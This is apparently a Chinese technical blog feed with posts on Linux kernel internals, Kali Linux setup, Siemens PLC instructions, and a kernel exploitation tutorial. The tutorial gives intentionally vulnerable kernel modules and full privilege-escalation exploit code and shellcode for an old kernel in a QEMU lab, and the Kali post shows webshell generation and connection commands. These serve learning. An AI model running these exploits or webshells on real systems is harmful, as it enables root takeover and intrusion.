    <content type="text"><![CDATA[* 1.Linux进程管理子系统 * 2.Linux网络子系统 * 3.虚拟文件系统 * 4.Linux设备驱动简介 Linux进程管理子系统在进程管理中最重要的就是进程的调度和进程的通信下面我们一一分析。 进程调度进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。 进程调度意义进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。 进程的状态切换Linux的进程在几个状态间进行切换，如下图展现了其切换关系。 进程调度策略Linux中常见的有以下： SCHED_OTHER 分时调度策略。 SCHED_FIFO实时调度策略，先到先服务 SCHED_RR实时调度策略，时间片轮转 进程通信Linux支持进程间的多种通信机制，可以通过这些通信机制进行多个进程、多资源的互斥访问、进程间的同步和消息传递。 linux进程间通信方式 管道：分为有名管道（用于同一系统间的任意进程）和无名管道（用于父子进程） 信号量 信号 消息队列 共享内存 套接字（socket） Linux网络子系统Linux网络子系统提供了对各种网络标准的存取和各种硬件的支持。下图是其整体结构。其可以分为协议层和网络驱动程序，其中网络协议主要负责实现每一种可能的网络传输协议，而网络驱动程序负责与硬件通信。 Linux虚拟文件系统Linux虚拟文件系统（VFS）隐藏了各种硬件的具体细节，为所有的设备提供了统一的接口，它是对各种文件系统的一个抽象，其实使用超级块super block存放文件系统相关信息，使用索引节点inode存放文件的物理信息，使用目录项dentry存放文件的逻辑信息，其整体架构如下。 Linux设备驱动简介上面的介绍很简单，仅仅是对这些子系统的概念什么的进行了简介，下面我们对linux设备驱动进行简单介绍。 设备驱动分类Linux分为下面三种基本设备。 字符设备是一种按照字节来访问的设备，字符设备适用于大多数的简单硬件。常见的LED、按键等 块设备是一种以块（通常为512字节）为最小访问单位的设备，常见的硬盘、SD卡等。但在linux中对块没有大小限制，可以访问任意数目的字节。 网络设备用来负责发送和接收报文的设备，比如网卡。]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（三）]]></title>
    <url>%2F2018%2F10%2F16%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[* Linux地址映射 * Linux内存分配 在分析今天的内容之前，我们先看一位大神做的内存管理图。其实这张图可以分为两个部分，一部分是地址映射，另一部分就是内存分配。 Linux地址映射下面的分析我们依据上图进行分析，首先我们来看其最右边的地址分布图（当然这是虚拟空间）。其地址分布总的可以分为两个部分我们下面慢慢分析（基于32位处理器）。 用户空间（0~3G）空间简介其从0x00000000到0xBFFFFFFF共3GB的线性地址空间，每个进程都有一个独立的3GB用户空间，当然这是虚拟的空间。如何转换为物理空间这一部分虚拟空间到物理空间的转换方法是我们以前在http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。 内核空间（3~4G）其从0xC0000000到0xFFFFFFFF共1GB大小，内核空间又可以根据映射方式的不同分为下面四块，我们一一分析 内核逻辑地址空间空间简介其从0xC0000000到high_memory(图中896MB的地方)最大为896MB（也就是说这块空间有可能不满，但最大为896MB），当然是虚拟空间。注：在此注意一下896MB我们一会在分析。如何转换为物理空间这一部分虚拟地址与物理内存中对应的地址只差一个固定偏移量（3G），如果内存物理地址空间从0x00000000地址编址，那么这个固定偏移量就是PAGE_OFFSET（如上图）。 Vmalloc空间空间简介其地址没有严格的界限，这段空间既可以访问到我们的高端内存，也可以访问到低端内存。如何转换为物理空间不是通过简单的线性关系映射，在此不研究。 永久内核映射空间简介其固定用来访问高端内存。如何转换为物理空间不是通过简单的线性关系映射，在此不研究。 固定映射空间简介其在系统初始化期间永久映射I/O地址空间，或者特殊的寄存器。 遗留知识在刚才我们前面的分析中我们留下了一些问题下面进行解释。 低端内存内核逻辑地址空间所映射的物理内存就是低端内存(实际物理内存的大小，但是小于896MB) 高端内存低端内存地址之上的物理内存是高端内存（物理内存896MB之上）。 896MB来由Linux将内存分为内核空间和用户空间，其中内核空间中的0xC0000000~high_memory部分用来映射物理内存，但是我们还需要映射I/O空间和固定的寄存器，所以留出了high_memory~0xFFFFFFFF之间的地址来映射I/O空间和固定的寄存器，而在X86平台根据经验设定了这个high_memory为896MB。 Linux内存分配通过上面的介绍我们对linux对内存的管理，以及地址的映射有了一个了解，下面我们来分析linux是如何进行内存分配的。通过上图我们可以分析出内存的分配过程： 由malloc、fork等系统调用和kmalloc、vmalloc申请得到虚拟内存。 在我们使用该内存的时候，产生请页异常（kmalloc除外） 从空闲的页框分配物理内存，和虚拟地址建立映射。 注：kmalloc申请空间是不用经过请页异常的，返回的虚拟地址已经对应了物理内存。Kmalloc可以分配到连续的物理内存，vmalloc分配的是非连续的物理内存。]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（二）]]></title>
    <url>%2F2018%2F10%2F16%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[* 1.Linux内核模块简介 * 2.简单内核模块实现 Linux内核模块简介何为内核模块在上一篇博文中我们先通过内核配置，在配置的过程中我们对内核的组件进行了选择（当然这个选择决定了我们内核的大小），然后才生成了我们最终的内核，那么我们如果想添加组件，怎么办？最笨的方法是对内核进行重新配置，然后在重新编译。这样的话岂不是说我加一个组件就得重新编译内核，这显然不是很科学的方法，其实我们的linux内核提供在运行时可进行扩展的特性，这意味着当系统启动并运行时，我们可以向内核添加或移除部分功能。我们在运行时添加到内核中的代码就被成为动态可加载内核模块，我们简称为内核模块。 内核模块的相关操作加载内核模块：insmod卸载内核模块：rmmod查看内核模块：lsmod 模块声明MODULE_LICENSE（“GPL”）：内核可以识别的许可证有GPL（任意版本GNU通用公共许可证）、GPL v2等MODULE_AUTHOR（“作者”）：声明作者信息可以不用MODULE_VERSION（“版本”）：声明版本信息也可以不用MODULE_DESCRIPTION（“功能描述”）：声明模块功能，可不用 模块参数我们可以在加载内核模块的时候向其传递参数，以让同一代码达到不同的效果。当然我们的参数必须用module_param宏来声明具体如下：module_param（name，type，perm）name：变量名type：数据类型内核支持模块参数类型有：bool、invbool（bool的发转，true变为false，false变为true）、charp（char类型指针值）、int、long、short、uint、ulong、ushortperm：常见的访问许可值通常为S_IRUGO和S_IWUSR。通常情况下将他们按位或同时我们也可以用下面的宏声明数组： Module_param_array（name，type，num，perm） 模块符号导出当一个模块要使用另一个模块的函数（变量）的时候，要使用EXPORT_SYMBOL（符号名）或者EXPORT_SYMBOL_GPL（符号名）来申明。注：EXPORT_SYMBOL_GPL（）只适用于遵循GPL协议的模块 简单内核模块实现想必大家都记得我们在学习某种语言的时候，写的第一个程序大部分都是输出hello world，所以我接下来用我们刚才介绍的内核模块去完成hello world。 内核模块编写通过上面部分内容的介绍，要完成第一内核模块不是很难，下面是自己的代码。 #include&lt;linux/init.h&gt; #include&lt;linux/module.h&gt; MODULE_LICENSE(&quot;GPL&quot;); staticint hello_init(void) { printk(&quot;&lt;0&gt; hello world\n&quot;); return0; } staticvoid hello_exit(void) { printk(&quot;&lt;0&gt; goodbye\n&quot;); } module_init(hello_init);//该宏在模块的目标代码中增加一个特殊的段，用于说明内核初始化函数所在的位置 module_exit(hello_exit);//跟上面的宏对立 Makefile编写Makefile的编写也比较简单，要注意的地方代码中已经说明。 obj-m := hello.o DIRS :=/smbshare/linux-2.6.39///此处路径为内核源码路径，该内核源码必须要经过编译，不然会报错 all: make -C $(DIRS) M=$(PWD) modules clean: rm -Rf*.o *.ko *.mod.c *.order *.symvers 经过了上面两个步骤，我们然后编译加载然后卸载我们的模块进行试验。编译：加载：查看：卸载： Printk函数简介printk函数为内核打印函数，其和printf函数功能类似，不过比printf多了打印权限一共有8个级别，printk的日志级别定义如下（在include/linux/kernel.h中）： #define KERN_EMERG 0 //紧急事件消息，系统崩溃之前提示，表示系统不可用 #define KERN_ALERT 1 //报告消息，表示必须立即采取措施 #define KERN_CRIT 2 //临界条件，通常涉及严重的硬件或软件操作失败 #define KERN_ERR 3 //错误条件，驱动程序常用KERN_ERR来报告硬件的错误 #define KERN_WARNING 4 //警告条件，对可能出现问题的情况进行警告 #define KERN_NOTICE 5 //正常但又重要的条件，用于提醒 #define KERN_INFO 6 //提示信息，如驱动程序启动时，打印硬件信息 #define KERN_DEBUG 7 //调试级别的消息 给大家推荐一个比较好用的工具，叫做exvim其将好多vim的工具进行了集成，个人感觉十分方便，就是换电脑什么的也不怕自己的配置丢失了。大家有兴趣的可以去http://exvim.github.io/ 了解。]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核分析（一）]]></title>
    <url>%2F2018%2F10%2F16%2FLinux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[* 1.Linux体系结构简介 * 2.Linux内核源码简介 * 3.Linux内核配置、编译、安装 Linux体系结构简介Linux体系结构（linux系统构成）Linux可以分为两部分，分别为用户空间和内核空间具体如下图：用户空间包括：用户的应用程序、C库内核空间包括：系统调用接口、内核（狭义内核）、平台架构相关的代码 为什么要分为内核空间和用户空间我们在分析u-boot的时候就说到过，我们的cpu在不同的工作模式下可以访问的寄存器是不一样的，所以为了保护我们的操作系统，避免用户程序将内核搞崩，所以进行了内核空间和用户空间的划分。Arm处理器工作模式划分：usr、FIQ、IRQ、svc、abt、und、sys（具体介绍在http://www.cnblogs.com/wrjvszq/p/4199682.html）X86处理器工作模式划分：Ring0—Ring3，Ring0下可以执行特权指令，可以访问IO设备，Ring3则有很多的限制注：我们可以通过系统调用和硬件中断来完成用户空间到内核空间的转移 Linux内核结构（广义内核）Linux内核由七个部分构成，具体如下图：系统调用接口（SCI）：open、read、write等系统调用进程管理（PM）：创建进程、删除进程、调度进程等内存管理（MM）：内存分配、管理等虚拟文件系统（VFS）：为多种文件系统提供统一的操作接口网络协议栈：提供各种网络协议CPU架构相关代码（Arch）：为的是提高至移植性设备驱动程序（DD）：各种设备驱动，占到内核的70%左右代码 Linux内核源码简介源码获取Linux内核获取有两种方法，一种是在www.kernel.org 直接获取，另一种是使用git获取（具体方法参考网络）。 源码目录简介其源码主要有以下目录（介绍重要目录）：Arch目录：存放处理器相关的代码。下设子目录，分别对应具体的CPU，每个子目录有boot，mm，以及kernel三个子目录，分别对应系统引导以及存储管理，和系统调用Include目录：内核所需要的大部分头文件目录。与平台无关的在include/linux子目录下，与平台相关的则放在include相应的子目录中。fs目录：存放各种文件系统的实现代码。init目录：init子目录包含核心的初始化代码（不是系统的引导代码）。其包含两个文件main.c和version.c，可以用来研究核心如何工作。ipc目录：包含核心进程间的通信代码。kernel目录：包含内核管理的核心代码。与硬件相关代码放在arch//kernel目录下。mm目录：包含了所有的内存管理代码。与硬件相关的内存管理代码位于arch//mm目录下。scripts目录：包含用于配置核心的脚本文件。lib目录：包含了核心的库代码，与硬件相关的库代码被放在arch/*/lib/目录下 Linux内核配置、编译、安装X86配置Linux内核的编译有两种方法，具体如下：交互式：在内核顶层的目录下运行make config，按照提示一步一步的按照自己的需求对内核进行配置。菜单式：在内核顶层的目录下运行make menuconfig，菜单式的按照自己的需求对内核进行配置。 X86编译Linux内核的编译要经过以下步骤，具体如下： 内核编译：linux内核的编译有以下两种方法。make zImage：编译出的内核小于512k（老版本内核）make bzImage：通用编译命令注：在以上两个命令中加V=1可查看编译过程中的详细信息 内核模块编译：执行make modules编译内核模块。 内核模块安装：执行make modules_install将编译好的内核模块复制到当前系统的/lib/modules下的 目录下。 内核模块打包：执行mkinitrd initrd-$version $version对内核模块进行打包，其中initrd-$version表示要打包为的文件的名字，$version表示要打包的目录即我们上一步生成的目录。 X86安装Linux内核的安装要经过以下步骤，具体如下： 拷贝内核：复制1编译出来的内核映像到启动目录cp arch/$cpu/boot/bzImage（1编译出来的bzimage）/boot/vmlinuz-$version 拷贝内核模块文件：执行cp initrd-$version（4生成的文件） /boot/ 将4生成的文件拷贝到boot下 修改启动配置文件：修改/etc/grub.conf文件]]></content>
      <categories>
        <category>Linux</category>
        <category>Linux内核分析</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali linux安装配置]]></title>
    <url>%2F2018%2F10%2F16%2Fkali-linux%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[U盘给物理机装kali的一些问题：安装教程 挂载不了u盘：用dd命令直接在linux下把kali的镜像文件刻录进U盘dd if=xxx.iso of=/dev/sdb bs=4M 安装系统失败：图形界面安装，分区全分给一个盘(sda) Debootstart错误 无法确定发布代号分区表错误，重新格式化硬盘，重建分区表 安装GRUB失败iso的一个bug，64位镜像的话插网线，联网装。32位没事 更新源一些问题：无法验证下列签名Ubuntu：apt-get update出错：由于没有公钥，无法验证下列签名解决方法sudo apt-key adv –recv-keys –keyserver keyserver.Ubuntu.com 7E5FA1EE 签名过期:wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add 明文签署文件不可用解决方法：换个源更新 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 然后执行命令: apt-get update #更新系统 apt-get upgrade #升级系统 apt-get dist-upgrade #升级系统(自选) apt-get clean #删除/var/cache/apt/archives/ 和 /var/cache/apt/archives/partial/目录下所有包(锁定的除外) upgrade和dist-upgrade的差别: upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来. dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.(所以通常这个会被认为是有点风险的升级) kali无法正常上网解决办法 kali设置固定ip/etc/network下的interfaces文件，打开后可以看到eth0为dhcp，将其修改为如下形式： auto eth0 iface eth0 inet static //配置eth0使用默认的静态地址 address 192.168.77.133 //设置eth0的IP地址 netmask 255.255.255.0 //配置eth0的子网掩码 gateway 192.168.77.254 //配置当前主机的默认网关 配置DNS： /etc/resovl.conf domain nameserver 10.10.10.10 nameserver 102.54.16.2 完成后保存，然后在终端里边重启网络： /etc/init.d/networking restart kali安装中文输入法apt-get install fcitx apt-get install fcitx-googlepinyin init 6 kali安装flash player在地址栏输入网址https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。打开终端，并切换到下载文件所在目录，执行以下命令： tar xzvf install_flash_player_11_linux.x86_64.tar.gz 进入解压出来的文件夹，找到libflashplayer.so拷贝到/usr/lib/mozilla/plugins/下，命令如下： cp libflashplayer.so /usr/lib/mozilla/plugins/ kali安装百度云dpkg -i bcloud-x.x.x.deb apt-get -f install kali安装WPS参考 dpkg -i x.x.x.deb apt-get -f install gdebi kali安装sublime安装注册 kali安装pycharm下载和安装Linux下将pycharm图标添加至桌面设置桌面快捷方式激活设置快捷键为pycharm:ln -s /root/下载/pycharm/bin/pycharm.sh /usr/bin/pycharmIDEA注册码 kali的firefox设置成中文参考 kali下webshell管理工具webacoo没有密码，只能用于php 生成服务端程序webacoo -g -o a.php 客户端连接webacoo -t -u http://202.196.73.125/a.php Weevely ~# weevely generate b.php ~# cat /usr/share/weevely/b.php 客户端连接：weevely http://202.196.73.125/b.php pass kali安装nessus参考使用在安装注册过程的4步，常常出现“Plugin Download Fail”问题，这个时候可以采用离线加载继续安装。下载离线安装包all-2.0.tar.gz并将它拷贝到nessus的安装目录下，在命令提示符下切换到nessus的安装目录下输入如下命令（此过程十分漫长情耐心等待）nessuscli update all-2.0.tar.gz kali下wine中文乱码参考 kali安装docker参考 kali安装virtualbox1、添加源： Add the following line to your /etc/apt/sources.list: deb http://download.virtualbox.org/virtualbox/debian artful contrib 2、添加公钥 wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add - wget -q https://www.virtualbox.org/download/oracle_vbox.asc -O- | sudo apt-key add - 3、更新并安装 sudo apt-get update sudo apt-get install virtualbox kali下设置shadowsocks翻墙参考 /etc/init.d/shadowsockes restart #重启服务 vim /home/lalala/shadowsocks.json #配置服务端信息 sslocal -c /home/lalala/shadowsocks.json -d start #开启客户端 vim /etc/proxychains.conf #注释掉socks4，添加socks5 127.0.0.1 1080 #配置proxychains proxychains curl www.google.com 测试 kali设置Tor安装教程root下无法执行 kali安装ftp服务器参考创建用户及设置 kali添加环境变量参考 kali安装配置Redis参考 VMware给kali扩容gparted kali下开启sftp传文件service ssh start #开启ssh服务 SSH服务器拒绝了密码，ssh连不上kali 因为sshd的默认设置不允许root用户用密码远程登录 修改 vim /etc/ssh/sshd_config 找到 # Authentication: LoginGraceTime 120 PermitRootLogin without passwd StrictModes yes 改成: Authentication: LoginGraceTime 120 PermitRootLogin yes StrictModes yes 重启虚拟机 Xshell连接sftp传文件在本地提示下以sftp命令登陆拟要发送文件的主机。 Xshell:\&gt; sftp hostname 在sftp提示下以put命令发送需要的文件。 sftp:/home/user21&gt;put filename 在sftp提示下以get命令接收需要的文件。 sftp:/home/user21&gt;get filename cmd连接sftp传文件【控制面板】-【程序】-【打开或关闭Windows功能】，弹出Windows功能窗口，里面有个tftp客户端。在前面打勾确定。然后在cmd里就可以使用sftp了。C:\Users\ramma&gt;sftp serveruser name : 其他安装 apt-get install audacious #audacious音乐播放器 apt-get install smplayer #安装smplayer视频播放器 apt-get install synaptic #安装新立德 个人常用快捷键alt+enter 开终端 gnome-terminal supur+enter 开浏览器 ctrl+ enter 主目录 alt+f 搜索 supur+d 回到桌面(隐藏所有正常窗口) ctrl + alt +A 截图]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux内核漏洞利用]]></title>
    <url>%2F2018%2F10%2F16%2FLinux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[kernel exploitNULL Dereference漏洞代码#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/proc_fs.h&gt; void (*my_funptr)(void); int bug1_write(struct file *file,const char *buf,unsigned long len) { my_funptr(); return len; } static int __init null_dereference_init(void) { printk(KERN_ALERT &quot;null_dereference driver init!\n&quot;); create_proc_entry(&quot;bug1&quot;,0666,0)-&gt;write_proc = bug1_write; return 0; } static void __exit null_dereference_exit(void) { printk(KERN_ALERT &quot;null_dereference driver exit\n&quot;); } module_init(null_dereference_init); module_exit(null_dereference_exit); Makefileobj-m := null_dereference.o KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/ PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 代码中my_funptr函数指针指向不定，可以劫持之后执行代码，原理如下图所示。 把驱动编译好，然后把*.ko文件丢进busybox那个文件系统中去，方便后面挂载使用。 POC#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/mman.h&gt; char payload[] = &quot;\xe9\xea\xbe\xad\x0b&quot;;//jmp 0xbadbeef int main(){ mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, payload, sizeof(payload)); int fd = open(&quot;/proc/bug1&quot;, O_WRONLY); write(fd, &quot;muhe&quot;, 4); return 0; } gcc -static poc.c -o poc 编译好之后把程序复制到busybox-1.19.4/_install/usrfind . | cpio -o –format=newc &gt; ../rootfs2.img 生成新的rootfsqemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../../busybox-1.19.4/rootfs.img -append “root=/dev/ram rdinit=/sbin/init” 启动系统。启动的时候按下ctrl+alt+2，然后gdb去连接。qemu中ctrl+alt+1切换回去，然后进入usr目录，挂载驱动后运行poc程序。gdb里反汇编查看当前执行的指令。 pdisass $pcexploit的思路是利用commit_creds(prepare_kernel_cred(0));给当前进程赋予root权限，kernel里面是不能直接执行system(“/bin/sh”);的。先取得commit_creds和prepare_kernel_cred地址。 grep commit_creds /proc/kallsyms grep prepare_kernel_cred /proc/kallsyms编写shellcode。得到shellcode。我们需要分配0地址空间然后放入shellcode，jmp过去执行shellcode，使当前进程有root权限，然后执行system(“/bin/sh”);，在程序返回用户态之后拿到一个root的shell。 EXP#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/mman.h&gt; char payload[] = &quot;\x31\xc0\xe8\xb9\x7f\x06\xc1\xe8\x14\x7e\x06\xc1\xc3&quot;; int main() { mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, payload, sizeof(payload)); int fd = open(&quot;/proc/bug1&quot;, O_WRONLY); write(fd, &quot;muhe&quot;, 4); system(&quot;/bin/sh&quot;);//get root shell return 0; } 新建用户去测试EXP。但是得到报错。这是因为2.6.32内核已经设置mmap_min_addr为4096作为缓解措施需要重新设置下mmap_min_addr：sysctl -w vm.mmap_min_addr=”0”重新运行EXP。成功拿到root shell。 Kernel Stack Overflow漏洞代码#include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/kernel.h&gt; #include &lt;linux/proc_fs.h&gt; int bug2_write(struct file *file,const char *buf,unsigned long len) { char localbuf[8]; memcpy(localbuf,buf,len); return len; } static int __init stack_smashing_init(void) { printk(KERN_ALERT &quot;stack_smashing driver init!\n&quot;); create_proc_entry(&quot;bug2&quot;,0666,0)-&gt;write_proc = bug2_write; return 0; } static void __exit stack_smashing_exit(void) { printk(KERN_ALERT &quot;stack_smashing driver exit!\n&quot;); } module_init(stack_smashing_init); module_exit(stack_smashing_exit); Makefileobj-m := stack_smashing.o KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/ PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 和用户态的栈溢出原理一样，拷贝、拼接字符串的时候未作长度检查，导致覆盖栈上保存的返回地址，只后可以劫持程序流程，从而实现代码执行的效果。只不过这是在内核空间，可以直接用来提权。 POC#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; int main(){ char buf[24] = {0}; memset(buf,&quot;A&quot;,24); *((void**)(buf + 20)) = 0x42424242; int fd = open(&quot;/proc/bug2&quot;,O_WRONLY); write(fd,buf,sizeof(buf)); } 可以看到payload结构很简单，直接就是buffer+eip。按照前面的步骤编译POC，然后构建文件系统，qemu起内核后，运行POC。我们编译的kernel默认开启canary的，如果直接这么去运行POC，会直接kernel panic，无法利用，所以需要关闭canary选项，重新编译一个内核。编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核。再起内核跑我们的POC，发现eip被覆盖成了0x42424242。模块在编译后按照上篇文章的方法，丢进busybox，然后qemu起内核然后调试。由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。由于stack_smashing模块没有bss和data节区所以只需要指定text即可。qemu中设置好gdbserver后，找到模块的.text段的地址grep 0 /sys/module/stack_smashing/sections/.text。运行POC之后发现eip被覆盖成了预期的值。 EXP拿到shell的思路还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，返回到用户模式执行iret指令。当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。当使用iret指令返回到一个不同的保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。栈上保存了trap frame，返回到用户模式的时候恢复信息从以下结构读取。 struct trap_frame { void* eip; // instruction pointer +0 uint32_t cs; // code segment +4 uint32_t eflags; // CPU flags +8 void* esp; // stack pointer +12 uint32_t ss; // stack segment +16 } __attribute__((packed)); 那么get root shell的思路就是先去执行commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是说先把当前进程权限提到root，然后执行起shell操作，那么我们就可以得到一个root的shell了。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; struct trap_frame{ void *eip; uint32_t cs; uint32_t eflags; void *esp; uint32_t ss; }__attribute__((packed)); struct trap_frame tf; void get_shell(void){ execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL); } void init_tf_work(void){ asm(&quot;pushl %cs;popl tf+4;&quot; //set cs &quot;pushfl;popl tf+8;&quot; //set eflags &quot;pushl %esp;popl tf+12;&quot; &quot;pushl %ss;popl tf+16;&quot;); tf.eip = &amp;get_shell; tf.esp -= 1024; } #define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067b20; void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067980; void payload(void){ //payload here commit_creds(prepare_kernel_cred(0)); asm(&quot;mov $tf,%esp;&quot; &quot;iret;&quot;); } int main(void){ char buf[24]; memset(buf,0x41,24); *((void**)(buf+20)) = &amp;payload; //set eip to payload init_tf_work(); write(1,buf,sizeof(buf)); int fd = open(&quot;/proc/bug2&quot;,O_WRONLY); //exploit write(fd,buf,sizeof(buf)); return 0; } 调试EXP先要确定模块代码节地址。gdb中如图设置。然后就可以返回到系统中，运行EXP程序了。对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。查看一下栈顶的情况。接下来单步进入我们的payload。这里可以看到先去执行commit_creds(prepare_kernel_cred(0))了。我们主要关注iret。红色部分就是我们伪造的tf结构。这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。成功拿到root shell。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux内核漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西门子PLC指令表]]></title>
    <url>%2F2018%2F08%2F05%2F%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%8C%87%E4%BB%A4%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[位逻辑指令 时钟指令 通信指令 比较指令 转换指令 计数器指令 浮点数运算指令 整数运算指令 中断指令 逻辑运算指令 程序控制指令 传送指令 移位指令 字符串指令 表指令 定时器指令]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>plc</tag>
        <tag>梯形图</tag>
        <tag>西门子</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西门子PLC梯形图说明]]></title>
    <url>%2F2018%2F08%2F05%2F%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[位逻辑指令1.1 位逻辑指令概述 1.2 -||- 常开接点(地址) 1.3 -|/|-常闭接点(地址) 1.4 XOR位异或 1.5 -|NOT|- 信号流反向 1.6 -( ) 输出线圈 1.7 -(#)- 中间输出 1.8 -(R) 线圈复位 1.9 -(S) 线圈置位 1.10 RS复位置位触发器 1.11 RS置位复位触发器 1.12 -(N)-RLO下降沿检测 1.13 -(P)-PLO上升沿检测 1.14 -(SAVE) 将RLO存入BR存储器 1.15 MEG地址下降沿检测 1.16 POS地址上升沿检测 1.17 立即读操作 1.18 立即写操作 比较指令2.1 比较指令概述 2.2 CMP?I整数比较 2.3 CMP?D双整数比较 2.4 CMP?R实数比较 转换指令3.1 转换指令概述 3.2 BCD_IBCD码转换为整数 3.3 I_BCD整数转换为BCD码 3.4 I_DINT整数转换为双整数 3.5 BCD_DIBCD码转换为双整数 3.6 DI_BCD双整数转换为BCD码 3.7 DI_REAL双整数转换为浮点数 3.8 INV_I整数的二进制反码 3.9 INV_DI双整数的二进制反码 3.10 NEG_I整数的二进制补码 3.11 NEG_DI双整数的二进制补码 3.12 NEG_R浮点数求反 3.13 ROUND舍入为双整数 3.14 TRUNC舍去小数取整为双整数 3.15 CEIL上取整 3.16 FLOOR下取整 计数器指令4.1 计数器指令概述 4.2 S_CUD加减计数 4.3 S_CU加计数器 4.4 S_CD减计数器 4.5 -(SC)计数器置初值 4.6 -(CU)加计数器线圈 4.7 -(CD)减计数器线圈 数据块指令5.1 -(OPN)打开数据块:DB或DI 逻辑控制指令6.1 逻辑控制指令概述 6.2 -(JMP)- 无条件跳转 6.3 -(JMP)- 条件跳转 6.4 -(JMPN)- 若非则跳转 6.5 LABEL标号 整数算术运算指令7.1 整数算术运算指令概述 7.2 判断整数算术运算指令后状态字的位 7.3 ADD_I 整数加法 7.4 SUB_I 整数减法 7.5 MUL_I 整数乘法 